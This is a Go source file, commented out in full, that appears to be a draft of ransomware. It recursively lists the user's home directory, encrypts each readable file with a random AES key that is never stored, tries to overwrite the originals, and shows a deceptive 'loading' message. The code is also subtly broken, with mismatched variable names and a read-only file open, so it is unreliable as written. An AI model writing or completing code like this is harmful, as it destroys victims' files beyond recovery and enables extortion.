/*


 package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"
)

type key struct {
	key []byte
	iv  []byte
}

type ecryt struct {
	plainText  []byte
	cipherText []byte
}

type dcrypt struct {
	cipherText []byte
	plainText  []byte
}

type Dirs struct {
	fName    []string
	dirList  []string
	fType    map[string]string
	fContent []byte
}

type fData struct {
	file Dirs
}

func main() {
	fmt.Println("loading, it might take a while ...")
	hdir := UserHomeDir()
	fd := fData{}
	files := fd.Walk(hdir)

	ey, iv := keyiv()

	for _, name := range files {
		file, err := readFile(name)
		if err != nil {
			time.Sleep(time.Second * 1)
			err = err
		} else {
			cipherText := Encrypt(file, key, iv)
			fd, _ := os.Open(name)
			fd.Write(cipherText)
		}

	}

	//fmt.Println(string(cipherText))
	//decrypt := Decypt(cipherText, key, iv)
	//fmt.Println(string(decrypt))
}

func keyiv() (key []byte, iv []byte) {
	key = make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		fmt.Println(err)
	}

	iv = make([]byte, aes.BlockSize)
	_, err = io.ReadFull(rand.Reader, iv)
	if err != nil {
		fmt.Println(err)
	}

	return key, (iv)

}

func Encrypt(plainText []byte, key []byte, iv []byte) (cipherText []byte) {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(block)
	}

	cfb := cipher.NewCFBEncrypter(block, iv)

	cipherText = make([]byte, len(plainText))
	cfb.XORKeyStream(cipherText, plainText)

	return cipherText
}

func Decypt(cipherText []byte, key []byte, iv []byte) (plainText []byte) {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	plainText = make([]byte, len(cipherText))
	cfb := cipher.NewCFBDecrypter(block, iv)
	cfb.XORKeyStream(plainText, cipherText)
	return plainText
}

func readFile(name string) ([]byte, error) {
	f, err := ioutil.ReadFile(name)
	if err != nil {
		return nil, err
	}

	return f, nil
}

func UserHomeDir() (hpath string) {
	hpath, err := os.UserHomeDir()
	if err != nil {
		err = err
	}
	return hpath
}

func (fd *fData) Walk(path string) (fpath []string) {
	f, err := os.ReadDir(path)
	if err != nil {
		checkPerm := os.IsPermission(err)
		fmt.Print("processing ...")
		time.Sleep(time.Second * 1)
	}

	for _, file := range f {
		npath := filepath.Join(path, file.Name())
		if file.IsDir() {
			fd.Walk(npath)
		}
		fd.file.dirList = append(fd.file.dirList, npath)
	}

	return fd.file.dirList
}

func (ft *fData) CheckFileType([]string) {
	//
}

*/
